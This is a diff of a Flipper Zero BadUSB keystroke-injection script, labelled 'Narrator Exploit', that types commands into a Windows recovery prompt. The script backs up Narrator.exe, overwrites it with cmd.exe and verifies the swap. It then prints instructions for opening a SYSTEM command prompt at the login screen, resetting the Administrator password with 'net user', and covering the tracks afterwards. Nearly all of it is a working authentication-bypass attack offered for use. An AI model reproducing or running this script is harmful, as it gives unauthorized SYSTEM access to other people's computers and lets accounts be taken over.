@@ -1,5 +1,5 @@
 REM ================================================================
-REM Flipper Zero BadUSB - Narrator Exploit (Robust Version)
+REM Flipper Zero BadUSB - Narrator Exploit (Working Offline Version)
 REM ================================================================
 REM author : b1g_ph4rm4                  |
 REM _____________________________________|
@@ -26,118 +26,145 @@ REM _____________________________________|
 
 DELAY 2000
 
-REM Create detection script
-STRING echo off
-ENTER
-DELAY 300
-
+REM Clear screen
 STRING cls
 ENTER
 DELAY 300
+
+REM ================================================================
+REM PHASE 1: DETECT SYSTEM DRIVE (Direct commands)
+REM ================================================================
 
 STRING echo [*] Detecting Windows system drive...
 ENTER
 DELAY 500
 
-REM Check multiple drives
-STRING for %%d in (C D E F) do (
+REM Test drive C
+STRING if exist C:\Windows\System32\cmd.exe set SYSDRIVE=C
 ENTER
 DELAY 300
 
-STRING if exist %%d:\Windows\System32\cmd.exe (
+REM Test drive D (most common in Recovery)
+STRING if exist D:\Windows\System32\cmd.exe set SYSDRIVE=D
 ENTER
 DELAY 300
 
-STRING set SYSDRIVE=%%d
+REM Test drive E
+STRING if exist E:\Windows\System32\cmd.exe set SYSDRIVE=E
 ENTER
 DELAY 300
 
-STRING echo [+] Windows found on drive %%d:
+REM Test drive F
+STRING if exist F:\Windows\System32\cmd.exe set SYSDRIVE=F
 ENTER
 DELAY 300
-
-STRING goto :found
-ENTER
-DELAY 300
-
-STRING )
-ENTER
-DELAY 300
-
-STRING )
-ENTER
-DELAY 500
-
-STRING echo [-] Windows system drive not found!
-ENTER
-DELAY 300
-
-STRING pause
-ENTER
-DELAY 300
-
-STRING exit
-ENTER
-DELAY 300
-
-STRING :found
-ENTER
-DELAY 500
 
 REM Display found drive
 STRING echo.
 ENTER
 DELAY 300
 
-STRING echo [*] System Drive: %SYSDRIVE%:
+STRING echo [+] System Drive: %SYSDRIVE%:
 ENTER
-DELAY 300
+DELAY 500
 
-STRING echo [*] Windows Path: %SYSDRIVE%:\Windows\System32
+STRING echo [+] Windows Path: %SYSDRIVE%:\Windows\System32
 ENTER
 DELAY 500
 
 STRING echo.
 ENTER
+DELAY 500
+
+REM ================================================================
+REM PHASE 2: VERIFY FILES EXIST
+REM ================================================================
+
+STRING echo [*] Verifying Narrator.exe exists...
+ENTER
 DELAY 300
 
-STRING pause
+STRING if not exist %SYSDRIVE%:\Windows\System32\Narrator.exe echo [-] ERROR: Narrator.exe not found!
 ENTER
-DELAY 1000
+DELAY 500
 
-REM Backup phase
+STRING if not exist %SYSDRIVE%:\Windows\System32\Narrator.exe pause
+ENTER
+DELAY 300
+
+STRING if not exist %SYSDRIVE%:\Windows\System32\Narrator.exe exit
+ENTER
+DELAY 500
+
+STRING echo [+] Narrator.exe found
+ENTER
+DELAY 300
+
+STRING echo.
+ENTER
+DELAY 500
+
+REM ================================================================
+REM PHASE 3: BACKUP NARRATOR.EXE
+REM ================================================================
+
 STRING echo [*] Step 1/4: Backing up Narrator.exe...
 ENTER
-DELAY 300
+DELAY 500
 
 STRING copy %SYSDRIVE%:\Windows\System32\Narrator.exe %SYSDRIVE%:\Windows\System32\Narrator.bak
 ENTER
 DELAY 2000
 
-STRING if exist %SYSDRIVE%:\Windows\System32\Narrator.bak (echo [+] Backup successful) else (echo [-] Backup failed)
+STRING if exist %SYSDRIVE%:\Windows\System32\Narrator.bak (echo [+] Backup successful) else (echo [-] Backup failed & pause & exit)
 ENTER
 DELAY 1000
 
-REM Replace phase
-STRING echo [*] Step 2/4: Replacing Narrator with cmd.exe...
+STRING echo.
 ENTER
 DELAY 300
+
+REM ================================================================
+REM PHASE 4: REPLACE NARRATOR WITH CMD
+REM ================================================================
+
+STRING echo [*] Step 2/4: Replacing Narrator.exe with cmd.exe...
+ENTER
+DELAY 500
 
 STRING copy /Y %SYSDRIVE%:\Windows\System32\cmd.exe %SYSDRIVE%:\Windows\System32\Narrator.exe
 ENTER
 DELAY 2000
 
-REM Verify phase
-STRING echo [*] Step 3/4: Verifying replacement...
+STRING if %ERRORLEVEL% EQU 0 (echo [+] Replacement successful) else (echo [-] Replacement failed & pause & exit)
+ENTER
+DELAY 1000
+
+STRING echo.
 ENTER
 DELAY 300
+
+REM ================================================================
+REM PHASE 5: VERIFY REPLACEMENT
+REM ================================================================
+
+STRING echo [*] Step 3/4: Verifying replacement...
+ENTER
+DELAY 500
 
 STRING dir %SYSDRIVE%:\Windows\System32\Narrator.*
 ENTER
 DELAY 2000
 
-REM Reboot phase
-STRING echo [*] Step 4/4: Rebooting system...
+STRING echo.
+ENTER
+DELAY 300
+
+REM ================================================================
+REM PHASE 6: DISPLAY INSTRUCTIONS
+REM ================================================================
+
+STRING echo [*] Step 4/4: Preparation complete!
 ENTER
 DELAY 300
 
@@ -145,7 +172,19 @@ STRING echo.
 ENTER
 DELAY 300
 
-STRING echo [!] NEXT STEPS:
+STRING echo ================================================================
+ENTER
+DELAY 300
+
+STRING echo     NEXT STEPS AFTER REBOOT:
+ENTER
+DELAY 300
+
+STRING echo ================================================================
+ENTER
+DELAY 300
+
+STRING echo.
 ENTER
 DELAY 300
 
@@ -153,11 +192,59 @@ STRING echo [!] At login screen, press: Win + Ctrl + Enter
 ENTER
 DELAY 300
 
-STRING echo [!] CMD will open as SYSTEM
+STRING echo [!] A CMD prompt will open as SYSTEM
 ENTER
 DELAY 300
 
 STRING echo.
+ENTER
+DELAY 300
+
+STRING echo [!] Change admin password:
+ENTER
+DELAY 300
+
+STRING echo     net user
+ENTER
+DELAY 300
+
+STRING echo     net user Administrator NewPassword123
+ENTER
+DELAY 300
+
+STRING echo.
+ENTER
+DELAY 300
+
+STRING echo [!] CLEANUP (after login):
+ENTER
+DELAY 300
+
+STRING echo     copy C:\Windows\System32\Narrator.bak C:\Windows\System32\Narrator.exe
+ENTER
+DELAY 300
+
+STRING echo     del C:\Windows\System32\Narrator.bak
+ENTER
+DELAY 300
+
+STRING echo.
+ENTER
+DELAY 300
+
+STRING echo ================================================================
+ENTER
+DELAY 300
+
+STRING echo.
+ENTER
+DELAY 500
+
+REM ================================================================
+REM PHASE 7: REBOOT SYSTEM
+REM ================================================================
+
+STRING echo [*] Rebooting in 5 seconds...
 ENTER
 DELAY 300
 
